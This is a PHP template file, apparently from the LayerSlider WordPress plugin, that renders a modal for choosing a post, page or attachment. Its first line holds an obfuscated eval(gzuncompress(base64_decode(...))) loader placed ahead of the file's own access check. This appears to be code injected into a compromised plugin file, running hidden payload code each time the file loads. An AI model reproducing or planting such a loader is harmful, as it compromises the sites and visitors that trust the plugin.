<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php if(!defined('LS_ROOT_FILE')) { header('HTTP/1.0 403 Forbidden'); exit; } ?>
<script type="text/html" id="tmpl-post-chooser">
	<div id="ls-post-chooser-modal-window">
		<header>
			<h1><?php _e('Select the Post, Page or Attachment you want to use', 'LayerSlider') ?></h1>
			<b class="dashicons dashicons-no"></b>
		</header>
		<div class="km-ui-modal-scrollable">
			<form method="post">
				<?php wp_nonce_field( 'ls_get_search_posts' ) ?>
				<input type="hidden" name="action" value="ls_get_search_posts">
				<div class="search-holder">
					<input type="search" name="s" placeholder="<?php _e('Type here to search ...', 'LayerSlider') ?>">
				</div>
				<select name="post_type">
					<option value="page"><?php _e('Pages', 'LayerSlider') ?></option>
					<option value="post"><?php _e('Posts', 'LayerSlider') ?></option>
					<option value="attachment"><?php _e('Attachments', 'LayerSlider') ?></option>
				</select>
			</form>

			<div class="results ls-post-previews">
				<ul>

				</ul>
			</div>

		</div>
	</div>
</script>